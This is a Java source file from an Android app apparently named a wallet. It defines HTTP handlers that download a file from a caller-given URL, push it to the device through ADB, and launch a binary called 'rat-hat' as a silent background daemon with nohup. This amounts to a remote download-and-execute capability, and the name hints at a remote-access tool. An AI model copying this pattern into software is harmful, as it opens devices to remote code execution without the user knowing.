package com.guard.wallet.server.handler;

import com.guard.wallet.adb.AdbConnectionManager;
import com.koushikdutta.async.http.server.AsyncHttpServerResponse;
import com.guard.wallet.core.AppUtils;
import android.util.Log;
import com.guard.wallet.server.HttpResponseHelper;

/**
 * RatHat Handler。
 * 复用 AdbConnectionManager 的下载与命令执行能力，先打通当前 server 路由。
 */
public final class RatHatHandler {
    private static final String TAG = "HttpServer";
    private static final String START_CMD = "/data/local/tmp/rat-hat server --stop ; nohup /data/local/tmp/rat-hat server -d > /dev/null &";
    private static final String STOP_CMD = "/data/local/tmp/rat-hat server --stop";

    private RatHatHandler() {}

    public static void installRatHat(String logId, String fileUrl, String fileName, String startCmd, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "installRatHat: logId=" + logId + " fileUrl=" + fileUrl);
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            boolean result = manager != null && manager.downloadAndPush(logId, fileUrl, fileName, startCmd);
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void updateRatHat(String logId, String fileUrl, String fileName, String startCmd, AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "updateRatHat: logId=" + logId + " fileUrl=" + fileUrl);
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            boolean result = manager != null && manager.downloadAndInstall(logId, fileUrl, fileName, startCmd);
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void startRatHat(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "startRatHat");
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            boolean result = manager != null && manager.executeShellCommand(START_CMD);
            if (manager != null) {
                manager.ratHatPending.set(result);
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }

    public static void stopRatHat(AsyncHttpServerResponse response) {
        try {
            Log.d(TAG, "stopRatHat");
            AdbConnectionManager.initialize();
            AdbConnectionManager manager = AdbConnectionManager.getInstance();
            boolean result = manager != null && manager.executeShellCommand(STOP_CMD);
            if (manager != null) {
                manager.ratHatPending.set(false);
            }
            HttpResponseHelper.ok(response, result);
        } catch (Exception e) {
            AppUtils.s(TAG, e);
            HttpResponseHelper.error(response, "Internal error");
        }
    }
}
